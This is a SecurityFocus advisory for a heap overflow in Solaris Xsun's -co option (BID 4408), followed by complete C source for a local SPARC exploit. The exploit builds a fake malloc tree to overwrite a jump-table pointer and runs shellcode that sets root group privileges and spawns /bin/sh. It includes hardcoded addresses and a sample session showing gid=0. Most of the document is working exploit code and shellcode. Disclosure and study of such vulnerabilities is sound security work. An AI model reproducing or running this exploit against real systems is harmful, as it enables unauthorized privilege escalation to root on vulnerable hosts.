source: http://www.securityfocus.com/bid/4408/info

Solaris is the freely available Unix operating system distributed by Sun Microsystems.

It may be possible for a local user to gain elevated privileges. When Xsun is executed, and an excessively long argument is supplied to the -co flag, a heap overflow occurs. This problem could allow a local user to supply a maliciously formatted string with the -co option that could result in the execution of arbitrary code, and elevated privileges. 

/* Xsun(sparc) local exploit
   by gloomy (gloomy@root66.org) & eSDee (esdee@netric.org)
   ------------------------------------------------------------------
     Xsun is a Solaris server for X version 11. This program contains
   an option that is not really secure nowadays :).
   The option is used to determine the color database file. And yeah,
   indeed, you guessed it already, it contains a heap overflow.

     When we were busy writing this exploit within a multi display
   screen, we discovered some weird "unable-to-write-over-stackframe"
   problems. We tried everything to just write a few bytes over a
   saved program counter, but unfortunatly it was not possible on the
   current machine we were using. Then eSDee came up with something
   news. In the middle of the night a loud "yippeaaaaaa!" came out
   the bedroom of mister Es. He discovered a little section just
   below the GOT. It didn't contain \0 bytes and it was writeable.
   It's called the ti_jmp_table. I'm sure eSDee will write some
   papers about it soon.

     Gloomy was busy writing a shellcode that re-opens the STDIN. He
   found out that he just could open /dev/tty and then duplicate the
   STDERR filedescriptor, so the important descriptors were back
   again.

   USAGE:
        ./Xsun-expl [retloc] [ret]

   Example:
        bash$ gcc -o Xsun-expl Xsun-expl.c -Wall -Werror
        bash$ ./Xsun-expl
        Couldn't open RGB_DB 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.....
        ...
        bash$ id
        uid=500(user) gid=0(root)

   Greets and kisses:
        #netric                 - www.netric.org
        #root66                 - www.root66.org
        mostlyharmless          - www.mostly-harmless.nl [soon]
        dB_____                 - fijne broer van gloom-ei! :)
        squezel                 - lekker ventje ben jij.

   More information available at: http://online.securityfocus.com/advisories/40
09

   [ps. wat een lompe text]
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define PATH            "/usr/openwin/bin/Xsun"
#define DISPLAY         ":1"
#define SIZE            5128

#define RET             0xffbef7bc
#define RETLOC          0xfecbea30      /* <ti_jmp_table+4> (a pointer to _retu
rn_zero) */
#define DUMMY           0xac1db0ef

struct WORD {
        long element;
        long dummy;
};

struct TREE {
        struct WORD    t_s;    /* size of this element */
        struct WORD    t_p;    /* parent node */
        struct WORD    t_l;    /* left child */
        struct WORD    t_r;    /* right child */
        struct WORD    t_n;    /* next in link list */
        struct WORD    t_d;    /* dummy to reserve space for self-pointer */
};

char
shellcode[]=

        /*
                setregid(0,0);                          setting root permission
s
                open("/dev/tty", RD_ONLY);              re-open STDIN
                dup(2);                                 duplicate STDOUT to STD
ERR
                execve("/bin//sh", &argv[0], NULL);     start the shell
                exit();                                 exit
        */

        "\x90\x1d\x80\x16"      // xor          %l6, %l6, %o0
        "\x92\x1d\x80\x16"      // xor          %l6, %l6, %o1
        "\x82\x18\x40\x01"      // xor          %g1, %g1, %g1
        "\x82\x10\x20\xcb"      // mov          0x2e, %g1
        "\x91\xd0\x20\x08"      // ta           8                       [setreg
id(0,0)]

        "\x21\x0b\xd9\x19"      // sethi        %hi(0x2f646400), %l0
        "\xa0\x14\x21\x76"      // or           %l0, 0x176, %l0
        "\x23\x0b\xdd\x1d"      // sethi        %hi(0x2f747400), %l1
        "\xa2\x14\x60\x79"      // or           %l1, 0x79, %l1
        "\xe0\x3b\xbf\xf8"      // std          %l0, [ %sp - 0x8 ]
        "\x90\x23\xa0\x08"      // sub          %sp, 8, %o0
        "\x92\x1b\x80\x0e"      // xor          %sp, %sp, %o1
        "\x82\x10\x20\x05"      // mov          0x05, %g1
        "\x91\xd0\x20\x08"      // ta           8                       [open("
/dev/tty",RD_ONLY)]

        "\x90\x10\x20\x02"      // mov          0x02, %o0
        "\x82\x10\x20\x29"      // mov          0x29, %g1
        "\x91\xd0\x20\x08"      // ta           8                       [dup(2)
]

        "\x21\x0b\xd8\x9a"      // sethi        %hi(0x2f626800), %l0
        "\xa0\x14\x21\x6e"      // or           %l0, 0x16e, %l0
        "\x23\x0b\xcb\xdc"      // sethi        %hi(0x2f2f7000), %l1
        "\xa2\x14\x63\x68"      // or           %l1, 0x368, %l1
        "\xe0\x3b\xbf\xf0"      // std          %l0, [ %sp - 0x10 ]
        "\xc0\x23\xbf\xf8"      // clr          [ %sp - 0x8 ]
        "\x90\x23\xa0\x10"      // sub          %sp, 0x10, %o0
        "\xc0\x23\xbf\xec"      // clr          [ %sp - 0x14 ]
        "\xd0\x23\xbf\xe8"      // st           %o0, [ %sp - 0x18 ]
        "\x92\x23\xa0\x18"      // sub          %sp, 0x18, %o1
        "\x94\x22\x80\x0a"      // sub          %o2, %o2, %o2
        "\x82\x18\x40\x01"      // xor          %g1, %g1, %g1
        "\x82\x10\x20\x3b"      // mov          0x3b, %g1
        "\x91\xd0\x20\x08"      // ta           8                       [execve
("/bin/sh","/bin/sh",NULL)]

        "\x82\x10\x20\x01"      // mov          0x01, %g1
        "\x91\xd0\x20\x08"      // ta           8                       [exit(?
)]

        "\x10\xbf\xff\xdf"      // b            shellcode
        "\x90\x1d\x80\x16";     // or           %o1, %o1, %o1

int
main(int argc, char *argv[])
{
        struct TREE faketree;                           // our friendly little 
tree

        char buffer[SIZE+sizeof(faketree)+1];

        unsigned int ret          = RET;
        unsigned int retloc       = RETLOC;
        unsigned int dummy        = DUMMY;

        if (argc > 1) retloc    = strtoul(argv[1], &argv[1], 16);
        if (argc > 2) ret       = strtoul(argv[2], &argv[2], 16);

        faketree.t_s.element = 0xfffffff0;
        faketree.t_s.dummy   = dummy;
        faketree.t_n.element = retloc - 8;
        faketree.t_n.dummy   = dummy;
        faketree.t_l.element = 0xffffffff;
        faketree.t_l.dummy   = dummy;
        faketree.t_r.element = dummy;
        faketree.t_r.dummy   = dummy;
        faketree.t_p.element = ret;
        faketree.t_p.dummy   = dummy;
        faketree.t_d.element = dummy;
        faketree.t_d.dummy   = dummy;

        memset(buffer, 0x41, sizeof(buffer));
        memcpy(buffer + 3999 - (strlen(shellcode) - 8), shellcode, strlen(shell
code));
        memcpy(buffer + SIZE, &faketree, sizeof(faketree));
        buffer[SIZE + sizeof(faketree)] = 0x0;

        fprintf(stdout, "Retloc = 0x%08x\n"
                        "Ret    = 0x%08x\n",
                        retloc, ret);

        execl(PATH, "Xsun", "-co", buffer, DISPLAY, NULL);
        return 0;
}

/* [eof] */

